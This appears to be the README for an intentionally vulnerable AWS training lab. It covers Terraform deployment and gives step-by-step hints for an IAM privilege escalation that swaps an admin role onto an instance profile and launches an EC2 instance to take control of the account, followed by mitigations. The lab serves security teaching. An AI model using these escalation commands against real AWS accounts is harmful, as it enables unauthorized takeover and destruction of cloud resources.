# IAM Privilege Escalation by Attachment

## Scenario Overview

**Difficulty:** Medium

**Goal:** Delete the EC2 instance named `cg-super-critical-security-server-<CGID>`

**Starting Point:** IAM User "Kerrigan" with limited AWS permissions

## Scenario Description

Starting with a very limited set of permissions, the attacker is able to leverage the instance-profile-attachment permissions to create a new EC2 instance with significantly greater privileges than their own. With access to this new EC2 instance, the attacker gains full administrative powers within the target account and is able to accomplish the scenario's goal.

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        AWS Account                               │
│                                                                  │
│  ┌─────────────────────┐     ┌─────────────────────────────┐    │
│  │   IAM User:         │     │   Instance Profile:          │    │
│  │   Kerrigan          │     │   cg-ec2-meek-instance-profile│   │
│  │                     │     │                               │    │
│  │   Permissions:      │     │   ┌─────────────────────┐    │    │
│  │   - ec2:Describe*   │────▶│   │ Meek Role           │    │    │
│  │   - ec2:RunInstances│     │   │ (Low Privilege)     │    │    │
│  │   - iam:AddRole..   │     │   └─────────────────────┘    │    │
│  │   - iam:RemoveRole..│     │           ▲                   │    │
│  └─────────────────────┘     │           │ SWAP              │    │
│                              │           ▼                   │    │
│  ┌─────────────────────┐     │   ┌─────────────────────┐    │    │
│  │   Target EC2:       │     │   │ Mighty Role          │    │    │
│  │   super-critical-   │◀────┤   │ (Admin Privilege)    │    │    │
│  │   security-server   │     │   └─────────────────────┘    │    │
│  └─────────────────────┘     └─────────────────────────────┘    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## Deployment

### Prerequisites

- Terraform >= 1.5.0
- AWS CLI configured with appropriate credentials
- An AWS account (preferably a dedicated test account)

### Quick Start

1. Clone/copy this directory
2. Update `terraform.tfvars` with your settings
3. Deploy:

```bash
terraform init
terraform plan
terraform apply
```

4. Get your starting credentials from `start.txt` or terraform output:

```bash
terraform output -raw cloudgoat_output_kerrigan_secret_key
```

### Customization Options

Edit `terraform.tfvars` to customize:

| Variable | Description | Default |
|----------|-------------|---------|
| `profile` | AWS CLI profile | `default` |
| `region` | AWS region | `us-east-1` |
| `cgid` | Unique identifier | `abc123xyz` |
| `cg_whitelist` | IP whitelist for SSH | `["0.0.0.0/0"]` |
| `add_decoy_roles` | Number of decoy roles (difficulty) | `0` |
| `enable_cloudtrail` | Enable detection logging | `false` |

## Attack Path

<details>
<summary>🔍 Hint 1: Enumeration</summary>

Start by understanding what permissions you have:
```bash
aws sts get-caller-identity --profile kerrigan
aws iam list-instance-profiles --profile kerrigan
aws iam list-roles --profile kerrigan
```
</details>

<details>
<summary>🔍 Hint 2: Key Discovery</summary>

Notice there are two interesting roles:
- `cg-ec2-meek-role-*` (currently attached to the instance profile)
- `cg-ec2-mighty-role-*` (has higher privileges)

The instance profile can only have one role at a time...
</details>

<details>
<summary>🔍 Hint 3: Role Swapping</summary>

You can manipulate instance profiles:
```bash
aws iam remove-role-from-instance-profile \
  --instance-profile-name <meek-profile> \
  --role-name <meek-role> \
  --profile kerrigan

aws iam add-role-to-instance-profile \
  --instance-profile-name <meek-profile> \
  --role-name <mighty-role> \
  --profile kerrigan
```
</details>

<details>
<summary>🔍 Hint 4: New EC2 Instance</summary>

Create a new EC2 instance with the modified instance profile:
```bash
# Create SSH key
aws ec2 create-key-pair --key-name pwned \
  --query 'KeyMaterial' --output text > pwned.pem
chmod 400 pwned.pem

# Launch instance
aws ec2 run-instances \
  --image-id <ami-id> \
  --instance-type t2.micro \
  --iam-instance-profile Name=<profile-name> \
  --key-name pwned \
  --subnet-id <subnet-id> \
  --security-group-ids <sg-id> \
  --region us-east-1 \
  --profile kerrigan
```
</details>

<details>
<summary>✅ Full Solution</summary>

See [SOLUTION.md](./SOLUTION.md) for the complete walkthrough.
</details>

## Cleanup

**Important:** Clean up any resources you created manually before destroying:

```bash
# Terminate any EC2 instances you created
aws ec2 terminate-instances --instance-ids <your-instance-id> --region us-east-1

# Delete key pairs you created
aws ec2 delete-key-pair --key-name pwned --region us-east-1

# Then destroy the scenario
terraform destroy
```

## Learning Objectives

1. **IAM Instance Profiles**: Understanding how instance profiles work and their relationship to IAM roles
2. **Privilege Escalation**: Recognizing dangerous IAM permission combinations
3. **EC2 Metadata Service**: Accessing instance role credentials from within EC2
4. **AWS CLI Enumeration**: Systematic discovery of available permissions and resources

## Vulnerable Permissions

The key vulnerable permissions that enable this attack:

```json
{
  "Action": [
    "iam:AddRoleToInstanceProfile",
    "iam:RemoveRoleFromInstanceProfile",
    "ec2:RunInstances",
    "iam:PassRole"
  ]
}
```

## Mitigation Recommendations

1. **Restrict PassRole**: Limit which roles can be passed to EC2 instances
2. **Instance Profile Controls**: Restrict who can modify instance profiles
3. **Separation of Duties**: Don't allow the same user to modify instance profiles AND launch EC2 instances
4. **Resource-Based Restrictions**: Use conditions to limit PassRole to specific role ARNs
5. **IMDSv2**: Require IMDSv2 for all EC2 instances to prevent some SSRF-based credential theft

## Files

| File | Description |
|------|-------------|
| `main.tf` | Provider configuration and data sources |
| `variables.tf` | Customizable input variables |
| `vpc.tf` | VPC, subnet, and security group resources |
| `iam.tf` | IAM users, roles, policies, and instance profiles |
| `ec2.tf` | EC2 instance (target server) |
| `outputs.tf` | Scenario outputs and start.txt generation |
| `SOLUTION.md` | Complete attack walkthrough |

## Disclaimer

This is an intentionally vulnerable environment for educational purposes only. 
Deploy only in isolated test accounts. Never deploy in production environments.
